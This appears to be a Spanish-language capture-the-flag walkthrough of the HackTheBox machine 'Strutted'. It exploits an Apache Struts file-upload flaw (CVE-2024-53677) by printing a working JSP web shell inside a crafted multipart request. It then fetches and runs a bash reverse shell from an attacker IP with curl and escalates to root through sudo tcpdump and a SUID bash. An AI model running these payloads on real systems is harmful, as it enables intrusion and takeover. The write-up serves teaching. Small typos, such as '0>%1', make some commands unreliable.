---
title: Strutted - Medium (HTB)
permalink: /Strutted-HTB-Writeup/
tags: 
  - "Linux"
  - "Medium"
  - "Apache Struts"
  - "CVE-2024-53677"
  - "Tomcat"
  - "Information Leakage"
  - "Sudoers"
  - "Tcpdump"
categories:
  - writeup
  - hacking
  - hackthebox
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Strutted - Medium (HTB)
seo_description: Practica explotación a Apache Struts y abusa de privilegios mal configurados para vencer Strutted
excerpt: Practica explotación a Apache Struts y abusa de privilegios mal configurados para vencer Strutted
header:
  overlay_image: /assets/images/headers/strutted-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/strutted-hackthebox.jpg
---


![image-center](/assets/images/posts/strutted-hackthebox.png)
{: .align-center}

**Habilidades:** Apache Struts 6.3.0.1 - File Upload (CVE-2024-53677), Information Leakage, Abusing `sudo` Privileges - `tcpdump`
{: .notice--primary}

# Introducción

Strutted es una máquina Linux de dificultad `Medium` en HackTheBox donde explotaremos **CVE-2024-53677** en Apache Struts. Aprenderemos conceptos sobre esta tecnología y cómo podemos aprovecharla para eludir validaciones utilizando `Interceptors` y así ejecutar comandos en la máquina víctima. Luego de ganar acceso, tendremos que abusar de `tcpdump` para escalar privilegios.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima esté activa

~~~ bash
ping -c 1 10.10.11.59
PING 10.10.11.59 (10.10.11.59) 56(84) bytes of data.
64 bytes from 10.10.11.59: icmp_seq=1 ttl=63 time=146 ms

--- 10.10.11.59 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.020/146.020/146.020/0.000 ms
~~~


## Nmap Scanning

Realizaremos un escaneo de puertos para identificar todos los puertos que se encuentren abiertos. Primeramente usaremos el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.59 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 10:33 EDT
Nmap scan report for 10.10.11.59
Host is up (0.16s latency).
Not shown: 65080 closed tcp ports (reset), 453 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.37 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo frente a los puertos abiertos que hemos descubierto con el fin de identificar la versión y los servicios que se ejecuten

~~~ bash
nmap -p 22,80 -sVC 10.10.11.50 -oN services                                                                                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 10:37 EDT
Nmap scan report for 10.10.11.50
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.55 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Los servicios `ssh` y `http` se encuentran activos, como la versión de `ssh` no parece ser vulnerable, entonces navegaremos hasta la web


## Web Analysis

Al momento de navegar hasta la IP de la máquina víctima, podemos notar que nos intenta redirigir a `srtutted.htb`, pero nuestro sistema no puede resolver este nombre de dominio, por lo tanto, lo agregaremos al archivo `/etc/hosts`

![image-center](/assets/images/posts/strutted-domain.png)
{: .align-center}

~~~ bash
cat /etc/hosts | grep strutted.htb 

10.10.11.59 strutted.htb
~~~

Ahora nuestra máquina interpreta que `strutted.htb` corresponde a la IP de la máquina víctima. Si volvemos a nuestro navegador y recargamos, ahora deberíamos ver el contenido

~~~ bash
ping strutted.htb -c 1 
PING strutted.htb (10.10.11.59) 56(84) bytes of data.
64 bytes from strutted.htb (10.10.11.59): icmp_seq=1 ttl=63 time=152 ms

--- strutted.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 152.295/152.295/152.295/0.000 ms
~~~

Si lanzamos un escaneo a las tecnologías de la web, notaremos que parece ser una aplicación web de subida de imágenes

~~~ bash
whatweb http://strutted.htb          
http://strutted.htb [200 OK] Bootstrap, Content-Language[en-US], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[JSESSIONID], IP[10.10.11.59], Java, Script, Title[Strutted™ - Instant Image Uploads], UncommonHeaders[cross-origin-embedder-policy-report-only,cross-origin-opener-policy], nginx[1.18.0]
~~~

![image-center](/assets/images/posts/strutted-web-1.png)
{: .align-center}

Veamos cómo se comporta la web al enviar una foto cualquiera. En mi caso, enviaré una foto `cat.jpeg`

![image-center](/assets/images/posts/strutted-web-2.png)
{: .align-center}

Vemos cómo el servidor valida la imagen y nos muestra la foto además de un link para copiar el link de la foto, si hacemos clic no se copia. Veremos el error en la consola del navegador

![image-center](/assets/images/posts/strutted-web-3.png)
{: .align-center}


## Source Code Analysis

En la web podemos ver un mensaje un tanto inusual donde se nos dice que nos comparten una imagen Docker que muestra el entorno de Strutted

![image-center](/assets/images/posts/strutted-web-4.png)
{: .align-center}

En la esquina superior derecha vemos un botón para descargar, al hacer clic nos descarga un archivo `strutted.zip` que al parecer es el código fuente de la web. Lo traeremos a nuestro directorio de trabajo y analizaremos los archivos que contiene

~~~ bash
ls
strutted context.xml Dockerfile README.md tomcat-users.xml
~~~

Esta estructura parece ser de `tomcat` por el archivo `tomcat-users.xml`. Este archivo generalmente contiene credenciales de acceso, exploremos su contenido

~~~ bash
cat tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
~~~

Vemos que existe un usuario `admin` con un rol de administrador de la web, pero estas credenciales no nos servirán para nada. 

Además podremos ver las dependencias en el el archivo `pom.xml` que se encuentra en el directorio `strutted`

~~~ bash
cat pom.xml | grep struts 
        <struts2.version>6.3.0.1</struts2.version>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-core</artifactId>
                <version>${struts2.version}</version>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-config-browser-plugin</artifactId>
                <version>${struts2.version}</version>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-core</artifactId>
~~~
<br>


# Intrusión / Explotación
---
## Apache Struts 6.3.0.1 - File Upload (CVE-2024-53677)

Existe una vulnerabilidad que afecta a esta versión de Apache Struts que consiste en manipular parámetros en una acción de subida de archivos.

En el siguiente enlace podemos acceder a una prueba de concepto que establece una `webshell` con un archivo `.jsp` malicioso. Esto nos permitirá ejecutar comandos de forma remota y ganar acceso a la máquina

- https://github.com/EQSTLab/CVE-2024-53677

Dentro del exploit podemos ver el código que hace la explotación

~~~ bash
def exploit(self) -> None:
        files = {
            'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
            'top.UploadFileName': (None, self.path),
        }

        try:
            response = requests.post(self.url, files=files)
            print("Status Code:", response.status_code)
            print("Response Text:", response.text)
            if response.status_code == 200:
                print("File uploaded successfully.")
            else:
                print("Failed to upload file.")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
~~~

Pero tenemos un pequeño problema, no podremos enviar un archivo `.jsp` malicioso directamente, ya que el servidor solo admite archivos de imagen (`png`, `jpg`, `gif` o `jpeg`)

### Understanding Interceptors

Dentro de Apache Struts, podemos utilizar componentes que se ejecutan antes y después de una ejecución en el servidor (`action`). Estos componentes pueden agregar lógica adicional a estas acciones del servidor, como por ejemplo: validaciones de datos, manejo de sesión, etc.

- Una acción o `action` son clases dentro de la lógica definida en el código de la web que controlan las solicitudes del usuario, por ejemplo: `upload.action`, ejecuta la clase `Upload`

![image-center](/assets/images/posts/strutted-request.png)
{: .align-center}

Estos componentes son conocidos como Interceptores, (`Interceptors` en inglés). Y en el contexto de esta vulnerabilidad, podemos aprovechar estos interceptores para manipularlos y enviar un archivo que derive en ejecución de código 

~~~ bash
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------32834433022857169198100887216
Content-Length: 1192
Origin: http://strutted.htb
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://strutted.htb/upload.action
Cookie: JSESSIONID=99D75D10643DF4788C0CCE1B8C70CD4B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
...
...
-----------------------------304365947826637974553275897232
Content-Disposition: form-data; name="Upload"; filename="cat.jpeg"
Content-Type: image/jpeg

ÿØÿà
...
...
...
-----------------------------304365947826637974553275897232--
~~~

### Proof of Concept 

En la solicitud que interceptamos podemos ver que el parámetro `name` tiene como valor `upload`, que en teoría debe ser el nombre de la acción a ejecutar. Los interceptores necesitan que el valor esté con la primera letra en mayúsculas, es por eso que el exploit manipula este campo y lo envía con un valor en mayúsculas.

~~~ bash
-----------------------------371893311142375625202151022458
Content-Disposition: form-data; name="Upload"; filename="cat.jpeg"
Content-Type: image/jpeg

ÿØÿà






test
-----------------------------371893311142375625202151022458
Content-Disposition: form-data; name="top.UploadFileName"

test.txt
-----------------------------371893311142375625202151022458--
~~~

Al enviar la solicitud manipulada, intentaremos ver el archivo, si no, retrocederemos una ruta atrás hasta ver el archivo, en cada caso, se subirá el archivo correctamente

![image-center](/assets/images/posts/strutted-request-2.png)
{: .align-center}

### Exploitation

Como tenemos la capacidad de subir archivos, enviaremos una `web shell` para ejecutar comandos a través de un formulario. 

Editaremos la solicitud para enviar el contenido de la `web shell` como parte de la supuesta imagen, además editaremos la extensión del nombre para que sea `.jsp`. 

- https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp

~~~ bash
-----------------------------371893311142375625202151022458
Content-Disposition: form-data; name="Upload"; filename="cat.jpeg"
Content-Type: image/jpeg

ÿØÿà






test
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
-----------------------------371893311142375625202151022458
Content-Disposition: form-data; name="top.UploadFileName"

../../test.jsp
-----------------------------371893311142375625202151022458--
~~~

Cuando el archivo sea enviado, podremos acceder a él en el directorio raíz, navegaremos hasta `test.jsp`

![image-center](/assets/images/posts/strutted-poc-cve.png)
{: .align-center}


## Shell as `tomcat`

Intentaremos enviar una reverse shell de la forma típica, pero no podremos enviar la conexión directamente

![image-center](/assets/images/posts/strutted-poc-cve-2.png)
{: .align-center}

Usaremos un archivo donde definiremos esta misma reverse shell

> `revshell`

~~~ bash
bash -c 'bash -i >& /dev/tcp/10.10.14.212/443 0>%1'
~~~

Pondremos un servidor HTTP a la escucha y solicitaremos desde la máquina víctima el recurso `revshell`. 

Utilizaremos el comando `curl` para solicitar el archivo y lo guardaremos en una ruta a la que tengamos capacidad de escritura, como `/tmp`

~~~ bash
curl http://10.10.14.212/revshell.sh -o /tmp/revshell
~~~

En nuestro servidor HTTP recibiremos un GET al archivo `revshell` 

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.59 - - [19/Apr/2025 14:43:20] "GET /revshell HTTP/1.1" 200 -
~~~

Pondremos un puerto a la escucha para recibir la `shell`, por ejemplo el `443`. Y enviaremos el siguiente comando al servidor

~~~ bash
bash /tmp/revshell
~~~

Luego de ejecutar el comando en el servidor recibiremos la `shell` como el usuario `tomcat`

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.212] from (UNKNOWN) [10.10.11.59] 35966
bash: cannot set terminal process group (1052): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@strutted:~$ whoami
whoami
tomcat
tomcat@strutted:~$ 
~~~
<br>


# Escalada de Privilegios
---
## TTY Treatment

Haremos un tratamiento de la TTY para poder tener una consola más cómoda, de forma que podamos hacer `Ctrl + C` sin que la shell se vaya pal carajo y `Ctrl + L` para limpiar la pantalla

~~~ bash
tomcat@strutted:~$ script /dev/null -c bash                                             
Script started, output log file is '/dev/null'.
tomcat@strutted:~$ ^Z
[1]  + 12077 suspended  nc -lvnp 443
root@parrot strutted # stty raw -echo; fg      
[1]  + 12077 continued  nc -lvnp 443
                                    reset xterm

tomcat@strutted:~$ export TERM=xterm
~~~


## Credentials Leakage - `tomcat-users.xml`

Como el servicio web ejecuta `tomcat`, podemos buscar el archivo de configuración que pueda contener credenciales para usuarios válidos. En este caso podemos encontrar el archivo `tomcat-users` en la ruta `etc/tomcat9/tomcat-users.xml` 

~~~ bash
tomcat@strutted:~$ cat /etc/tomcat9/tomcat-users.xml | grep password
  you must define such a user - the username and password are arbitrary.
  will also need to set the passwords to something appropriate.
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
  them. You will also need to set the passwords to something appropriate.
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
~~~

Vemos una contraseña, si intentamos migrar al usuario `james` en la terminal actual con el comando  `su`, no podremos por alguna configuración definida.


## Shell as `james`

Entonces entraremos por `ssh` desde nuestra máquina atacante utilizando estas credenciales

~~~ bash
ssh james@strutted.htb
The authenticity of host 'strutted.htb (10.10.11.59)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'strutted.htb' (ED25519) to the list of known hosts.
james@strutted.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)
...
...
james@strutted:~$ export TERM=xterm
~~~


## Abusing Sudoers Privileges - `tcpdump`

Si listamos los privilegios que tenemos asignados con `sudo`, notaremos que el usuario `james` puede ejecutar `tcpdump` como cualquier usuario sin proporcionar contraseña

~~~ bash
james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)
~~~
~~~ bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
~~~

Si buscamos acerca del abuso de `tcpdump`. En GTFOBins se nos comparte una forma de escalar nuestros privilegios al ejecutarlo con `sudo` 

![image-center](/assets/images/posts/strutted-tcpdump.png)
{: .align-center}

Para abusar de `tcpdump` tendremos que asignar una variable de entorno con el valor de un comando a ejecutar, en el ejemplo solamente estaríamos ejecutando `id`.

Creamos un archivo temporal y guardamos el valor del comando en él, luego lo usamos dentro del comando `tcpdump` para ejecutarlo con permisos elevados


## Root Time

En este caso el comando que ejecutaremos como `root` será asignar el bit `SUID` a la `bash`, así podremos ejecutarla como el propietario, o sea, `root`

~~~ bash
james@strutted:~$ COMMAND='chmod 4755 /bin/bash'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$ echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
james@strutted:~$ bash -p
bash-5.1# whoami
root
~~~

Gracias por leer, espero te haya sido de ayuda, te dejo la cita del día...

> There are people who have money and people who are rich.
> — Coco Chanel
{: .notice--info}
